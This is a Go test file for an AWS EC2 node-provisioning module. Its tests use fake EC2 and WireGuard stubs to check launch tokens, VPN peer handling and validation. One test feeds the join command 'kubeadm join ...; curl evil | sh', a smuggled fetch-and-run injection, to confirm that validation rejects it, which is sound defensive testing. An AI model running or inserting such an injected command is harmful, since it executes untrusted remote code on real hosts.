package aws

import (
	"context"
	"encoding/base64"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	awssdk "github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/aws/smithy-go"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	k8stypes "k8s.io/apimachinery/pkg/types"

	mlv1alpha1 "dcn.ssu.ac.kr/infra/api/ml/v1alpha1"
	pkgruntime "dcn.ssu.ac.kr/infra/pkg/runtime"
	sshhelper "dcn.ssu.ac.kr/infra/pkg/ssh"
	"dcn.ssu.ac.kr/infra/pkg/ssh/sshtest"
)

const testUID = "11111111-2222-3333-4444-555555555555"

func TestClientTokenForAttempt(t *testing.T) {
	a0 := clientTokenForAttempt(testUID, 0)
	if a0 != clientTokenForAttempt(testUID, 0) {
		t.Error("the same attempt must always yield the same token (idempotent retry after a crash)")
	}
	a1 := clientTokenForAttempt(testUID, 1)
	if a0 == a1 {
		t.Error("the next attempt must use a different token (relaunch after termination)")
	}
	if clientTokenForAttempt("other-uid", 0) == a0 {
		t.Error("different NodeProvisions must not share a token")
	}
	if clientTokenForAttempt(testUID, -5) != a0 {
		t.Error("a negative counter is treated as attempt 0")
	}
	for _, uid := range []string{testUID, strings.Repeat("x", 100), strings.Repeat("y", 200)} {
		for _, n := range []int{0, 1, 9, 12345, 2147483647} {
			tok := clientTokenForAttempt(uid, n)
			if len(tok) > 64 {
				t.Errorf("token longer than 64 chars (%d): %q", len(tok), tok)
			}
			if !strings.HasSuffix(tok, "-"+itoa(n)) {
				t.Errorf("attempt suffix lost for uid len %d: %q", len(uid), tok)
			}
		}
	}
	// Overlong UIDs differing only past the cut still get distinct tokens.
	if clientTokenForAttempt(strings.Repeat("x", 100)+"a", 1) == clientTokenForAttempt(strings.Repeat("x", 100)+"b", 1) {
		t.Error("hashed tokens for different long UIDs collided")
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for ; n > 0; n /= 10 {
		b = append([]byte{byte('0' + n%10)}, b...)
	}
	return string(b)
}

func TestBuildCloudInitParamsUsesSharedGPURule(t *testing.T) {
	for name, tc := range map[string]struct {
		hardware, label string
		want            bool
	}{
		"hardwareType gpu beats a non-gpu label": {"gpu", "worker", true},
		"hardwareType cpu beats a gpu-ish label": {"cpu", "gpu-a100", false},
		"empty hardwareType falls back to label": {"", "gpu", true},
		"empty hardwareType, label contains gpu": {"", "gpu-a100", true},
		"empty hardwareType, non-gpu label":      {"", "cpu", false},
		"hardwareType compared case-insensitive": {"GPU", "", true},
	} {
		np := &mlv1alpha1.NodeProvision{Spec: mlv1alpha1.NodeProvisionSpec{HardwareType: tc.hardware, NodeLabel: tc.label}}
		p := buildCloudInitParams(np, "kubeadm join 10.0.0.1:6443 --token a.b", "1.35.0", "1.35", pkgruntime.Config{})
		if p.IsGPUNode != tc.want {
			t.Errorf("%s: IsGPUNode = %v, want %v", name, p.IsGPUNode, tc.want)
		}
		if p.IsGPUNode != IsGPUNode(np) {
			t.Errorf("%s: cloud-init disagrees with IsGPUNode", name)
		}
	}
}

// ── ProvisionEC2Node against a fake EC2 and a fake VPN server ─────────────────

type fakeEC2 struct {
	mu          sync.Mutex
	existing    []types.Instance
	describeErr error
	runErr      error
	imageErr    error
	runInputs   []*ec2.RunInstancesInput
	describes   int
}

func (f *fakeEC2) DescribeInstances(context.Context, *ec2.DescribeInstancesInput, ...func(*ec2.Options)) (*ec2.DescribeInstancesOutput, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.describes++
	if f.describeErr != nil {
		return nil, f.describeErr
	}
	return &ec2.DescribeInstancesOutput{Reservations: []types.Reservation{{Instances: f.existing}}}, nil
}

func (f *fakeEC2) RunInstances(_ context.Context, in *ec2.RunInstancesInput, _ ...func(*ec2.Options)) (*ec2.RunInstancesOutput, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.runInputs = append(f.runInputs, in)
	if f.runErr != nil {
		return nil, f.runErr
	}
	return &ec2.RunInstancesOutput{Instances: []types.Instance{{InstanceId: awssdk.String("i-new")}}}, nil
}

// ubuntuImage is what the fake returns for any AMI: an available, EBS-backed
// x86_64 HVM Ubuntu-style image with an 8 GB /dev/sda1 root.
func ubuntuImage(id string) types.Image {
	return types.Image{
		ImageId: awssdk.String(id), State: types.ImageStateAvailable, Architecture: types.ArchitectureValuesX8664,
		RootDeviceType: types.DeviceTypeEbs, VirtualizationType: types.VirtualizationTypeHvm,
		RootDeviceName: awssdk.String("/dev/sda1"),
		BlockDeviceMappings: []types.BlockDeviceMapping{{
			DeviceName: awssdk.String("/dev/sda1"), Ebs: &types.EbsBlockDevice{VolumeSize: awssdk.Int32(8)}}},
	}
}

func (f *fakeEC2) DescribeImages(_ context.Context, in *ec2.DescribeImagesInput, _ ...func(*ec2.Options)) (*ec2.DescribeImagesOutput, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.imageErr != nil {
		return nil, f.imageErr
	}
	var out []types.Image
	for _, id := range in.ImageIds {
		out = append(out, ubuntuImage(id))
	}
	return &ec2.DescribeImagesOutput{Images: out}, nil
}

func (f *fakeEC2) DescribeSnapshots(context.Context, *ec2.DescribeSnapshotsInput, ...func(*ec2.Options)) (*ec2.DescribeSnapshotsOutput, error) {
	return &ec2.DescribeSnapshotsOutput{}, nil
}

func (f *fakeEC2) DescribeInstanceTypes(context.Context, *ec2.DescribeInstanceTypesInput, ...func(*ec2.Options)) (*ec2.DescribeInstanceTypesOutput, error) {
	return &ec2.DescribeInstanceTypesOutput{}, nil
}

func (f *fakeEC2) CreateTags(context.Context, *ec2.CreateTagsInput, ...func(*ec2.Options)) (*ec2.CreateTagsOutput, error) {
	return &ec2.CreateTagsOutput{}, nil
}

type provEnv struct {
	*sshtest.Stubs
	client *sshhelper.Client
	conf   string
	ec2    *fakeEC2
	np     *mlv1alpha1.NodeProvision
	nc     *mlv1alpha1.NodeProvisionNetConfig
}

const (
	wgKeyServer = "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS="
	wgConfBase  = "[Interface]\nAddress = 10.8.0.1/24\nListenPort = 51820\nPostUp = wg set %i private-key /etc/wireguard/k\n"
)

func newProvEnv(t *testing.T) *provEnv {
	t.Helper()
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	stubs := sshtest.NewStubs(t)
	dir := t.TempDir()
	conf := filepath.Join(dir, "wg0.conf")
	if err := os.WriteFile(conf, []byte(wgConfBase), 0o600); err != nil {
		t.Fatal(err)
	}
	stubs.Write("chown", "#!/bin/bash\nexit 0\n")
	stubs.Write("install", "#!/bin/bash\nargs=()\nwhile [ $# -gt 0 ]; do case \"$1\" in -o|-g) shift 2;; *) args+=(\"$1\"); shift;; esac; done\nexec /usr/bin/install \"${args[@]}\"\n")
	stubs.Write("flock", "#!/bin/bash\n[ \"$1\" = -w ] && shift 2\nshift\nexec \"$@\"\n")
	stubs.Write("wg", `#!/bin/bash
case "$*" in
  "show wg0 dump") printf 'SP\tSPUB\t51820\toff\n' ;;
  "show wg0 public-key") echo "`+wgKeyServer+`" ;;
  "show wg0 listen-port") echo 51820 ;;
  set*) echo "wg $*" >> "$FAKE_LOG/wg.calls" ;;
esac
`)
	stubs.Write("ip", "#!/bin/bash\necho '5: wg0    inet 10.8.0.1/24 scope global wg0'\n")
	srv := sshtest.Start(t, sshtest.Options{Env: []string{"PATH=" + stubs.Dir + ":" + os.Getenv("PATH"), "FAKE_LOG=" + stubs.LogDir, "WG_CONF=" + conf}})

	rng := "10.8.0.0/24"
	np := &mlv1alpha1.NodeProvision{
		ObjectMeta: metav1.ObjectMeta{Name: "worker-1", Namespace: "ns", UID: k8stypes.UID(testUID)},
		Spec: mlv1alpha1.NodeProvisionSpec{
			Region: "us-east-1", InstanceType: "t3.large",
			AWSConfig: &mlv1alpha1.AWSConfig{AMI: "ami-1", SubnetID: "subnet-1"},
		},
	}
	nc := &mlv1alpha1.NodeProvisionNetConfig{}
	nc.Spec.VPNRange = &rng
	nc.Spec.VPNServerPublicConfig.PublicIP = "203.0.113.9"
	nc.Spec.SoftwareConfig.KubernetesVersion = "1.35.0"
	nc.Status.ClusterJoinCommand = "kubeadm join 10.8.0.1:6443 --token abcdef.0123456789abcdef --discovery-token-ca-cert-hash sha256:00"

	fe := &fakeEC2{}
	old := newLaunchClient
	newLaunchClient = func(context.Context, string, AWSCredentials) (ec2LaunchAPI, error) { return fe, nil }
	t.Cleanup(func() { newLaunchClient = old })
	return &provEnv{Stubs: stubs, client: &sshhelper.Client{Conn: srv.Dial(t)}, conf: conf, ec2: fe, np: np, nc: nc}
}

func (e *provEnv) provision(t *testing.T) (*ProvisionResult, error) {
	t.Helper()
	return ProvisionEC2Node(context.Background(), e.np, AWSCredentials{}, e.client, e.nc, pkgruntime.Config{})
}

func (e *provEnv) confText() string {
	b, _ := os.ReadFile(e.conf)
	return string(b)
}

func TestProvisionEC2Node_ExistingInstanceIsAdoptedWithoutAllocatingAPeer(t *testing.T) {
	e := newProvEnv(t)
	e.ec2.existing = []types.Instance{inst("i-existing", awssdk.ToTime(nil), types.InstanceStateNameRunning)}

	res, err := e.provision(t)
	if err != nil {
		t.Fatal(err)
	}
	if res == nil || res.InstanceID != "i-existing" || !res.Adopted {
		t.Fatalf("result = %+v, want the existing instance adopted", res)
	}
	if res.VpnIP != "" || res.PublicKey != "" {
		t.Errorf("an adopted instance must not carry a new VPN identity: %+v", res)
	}
	if len(e.ec2.runInputs) != 0 {
		t.Error("RunInstances must not be called when an instance exists")
	}
	if e.Log("wg.calls") != "" || e.confText() != wgConfBase {
		t.Errorf("no VPN peer may be allocated/registered when adopting (wg calls %q, conf:\n%s)", e.Log("wg.calls"), e.confText())
	}
}

func TestProvisionEC2Node_LaunchRegistersPeerAndUsesAttemptToken(t *testing.T) {
	e := newProvEnv(t)
	e.np.Status.ProvisionRetryCount = 2
	res, err := e.provision(t)
	if err != nil {
		t.Fatal(err)
	}
	if res.InstanceID != "i-new" || res.Adopted || res.VpnIP == "" || res.PublicKey == "" {
		t.Fatalf("result = %+v", res)
	}
	if len(e.ec2.runInputs) != 1 {
		t.Fatalf("RunInstances calls = %d", len(e.ec2.runInputs))
	}
	if tok := awssdk.ToString(e.ec2.runInputs[0].ClientToken); tok != clientTokenForAttempt(testUID, 2) {
		t.Errorf("ClientToken = %q", tok)
	}
	if !strings.Contains(e.confText(), res.PublicKey) {
		t.Errorf("peer not persisted:\n%s", e.confText())
	}
}

// EC2's eventual consistency: DescribeInstances misses the instance that the
// ClientToken already created, so RunInstances answers IdempotentParameterMismatch.
func TestProvisionEC2Node_IdempotentParameterMismatchReleasesPeer(t *testing.T) {
	e := newProvEnv(t)
	e.ec2.runErr = &smithy.GenericAPIError{Code: "IdempotentParameterMismatch", Message: "different parameters"}

	res, err := e.provision(t)
	if !errors.Is(err, ErrInstanceAlreadyLaunched) {
		t.Fatalf("err = %v, want ErrInstanceAlreadyLaunched", err)
	}
	if res == nil {
		t.Fatal("the result must be non-nil (nil-safe for callers)")
	}
	if res.VpnIP != "" || res.PublicKey != "" || res.InstanceID != "" || res.Adopted {
		t.Errorf("result must be empty, the peer was released: %+v", res)
	}
	calls := e.Log("wg.calls")
	if !strings.Contains(calls, "allowed-ips") || !strings.Contains(calls, " remove") {
		t.Errorf("the peer registered for the rejected attempt must be removed from the live interface: %q", calls)
	}
	if strings.Contains(e.confText(), "PublicKey") {
		t.Errorf("the peer must be removed from wg0.conf too:\n%s", e.confText())
	}
}

func TestProvisionEC2Node_OtherLaunchErrorKeepsPeerForTheCaller(t *testing.T) {
	e := newProvEnv(t)
	e.ec2.runErr = &smithy.GenericAPIError{Code: "InsufficientInstanceCapacity", Message: "no capacity"}
	res, err := e.provision(t)
	if err == nil || errors.Is(err, ErrInstanceAlreadyLaunched) {
		t.Fatalf("err = %v", err)
	}
	if res == nil || res.VpnIP == "" || res.PublicKey == "" {
		t.Fatalf("the caller needs the peer identity to release it later: %+v", res)
	}
	if !strings.Contains(e.confText(), res.PublicKey) {
		t.Error("peer must stay registered for the caller to record")
	}
}

func TestProvisionEC2Node_LookupFailureAllocatesNothing(t *testing.T) {
	e := newProvEnv(t)
	e.ec2.describeErr = errors.New("throttled")
	res, err := e.provision(t)
	if err == nil || res != nil {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if e.Log("wg.calls") != "" || len(e.ec2.runInputs) != 0 {
		t.Error("nothing may be allocated or launched when the existing-instance check fails")
	}
}

func TestProvisionEC2Node_InvalidInputHasNoSideEffects(t *testing.T) {
	e := newProvEnv(t)
	e.nc.Status.ClusterJoinCommand = "kubeadm join 10.8.0.1:6443; curl evil | sh"
	if _, err := e.provision(t); err == nil {
		t.Fatal("expected validation error")
	}
	if e.ec2.describes != 0 || e.Log("wg.calls") != "" {
		t.Error("validation must fail before any AWS or VPN call")
	}
}

func TestProvisionEC2Node_NoVPNAdoptsToo(t *testing.T) {
	e := newProvEnv(t)
	e.np.Spec.DisableVPN = true
	e.ec2.existing = []types.Instance{inst("i-existing", awssdk.ToTime(nil), types.InstanceStateNamePending)}
	res, err := ProvisionEC2Node(context.Background(), e.np, AWSCredentials{}, nil, e.nc, pkgruntime.Config{})
	if err != nil || !res.Adopted || res.InstanceID != "i-existing" {
		t.Fatalf("res=%+v err=%v", res, err)
	}
}

// With the VPN disabled neither a vpnRange nor a VPN server connection is needed:
// the instance is launched with a WireGuard-free bootstrap and no peer.
func TestProvisionEC2Node_NoVPNLaunchesWithoutRangeOrServer(t *testing.T) {
	e := newProvEnv(t)
	e.np.Spec.DisableVPN = true
	e.nc.Spec.VPNRange = nil
	e.nc.Spec.VPNServerPublicConfig.PublicIP = ""

	res, err := ProvisionEC2Node(context.Background(), e.np, AWSCredentials{}, nil, e.nc, pkgruntime.Config{})
	if err != nil {
		t.Fatalf("a VPN-less launch must not need vpnRange or a VPN server: %v", err)
	}
	if res.InstanceID != "i-new" || res.VpnIP != "" || res.PublicKey != "" {
		t.Fatalf("result = %+v, want a launch without a VPN identity", res)
	}
	if len(e.ec2.runInputs) != 1 {
		t.Fatalf("RunInstances calls = %d", len(e.ec2.runInputs))
	}
	ud, err := base64.StdEncoding.DecodeString(awssdk.ToString(e.ec2.runInputs[0].UserData))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(ud), "wg0") || strings.Contains(string(ud), "wireguard") {
		t.Error("the user-data of a VPN-less node must not mention WireGuard")
	}
	if e.Log("wg.calls") != "" {
		t.Error("no VPN server call may be made")
	}
}

// With the VPN enabled a missing vpnRange must still be reported, before any AWS
// or VPN-server call.
func TestProvisionEC2Node_VPNWithoutRangeFails(t *testing.T) {
	e := newProvEnv(t)
	e.nc.Spec.VPNRange = nil
	if _, err := e.provision(t); err == nil || !strings.Contains(err.Error(), "no vpnRange configured") {
		t.Fatalf("err = %v, want the vpnRange error", err)
	}
	if e.ec2.describes != 0 || len(e.ec2.runInputs) != 0 || e.Log("wg.calls") != "" {
		t.Error("nothing may be called before the vpnRange validation")
	}
}

// A bad image fails before a VPN peer is registered or an instance launched.
func TestProvisionEC2Node_BadImageHasNoSideEffects(t *testing.T) {
	e := newProvEnv(t)
	e.ec2.imageErr = &smithy.GenericAPIError{Code: "InvalidAMIID.NotFound", Message: "no such image"}
	res, err := e.provision(t)
	if err == nil || !strings.Contains(err.Error(), "image validation failed") {
		t.Fatalf("err = %v", err)
	}
	if res != nil {
		t.Errorf("no peer was registered, so no result is owed to the caller: %+v", res)
	}
	if len(e.ec2.runInputs) != 0 || e.Log("wg.calls") != "" {
		t.Error("a bad image must fail before any VPN peer or instance is created")
	}
	if e.confText() != wgConfBase {
		t.Error("the VPN server config must be untouched")
	}
}

// The launch maps the image's root device and any root snapshot.
func TestProvisionEC2Node_LaunchUsesImageRootDevice(t *testing.T) {
	e := newProvEnv(t)
	if _, err := e.provision(t); err != nil {
		t.Fatal(err)
	}
	if len(e.ec2.runInputs) != 1 {
		t.Fatalf("launches = %d", len(e.ec2.runInputs))
	}
	m := e.ec2.runInputs[0].BlockDeviceMappings
	if len(m) != 1 || awssdk.ToString(m[0].DeviceName) != "/dev/sda1" || awssdk.ToInt32(m[0].Ebs.VolumeSize) != 50 {
		t.Fatalf("mappings = %+v", m)
	}
}
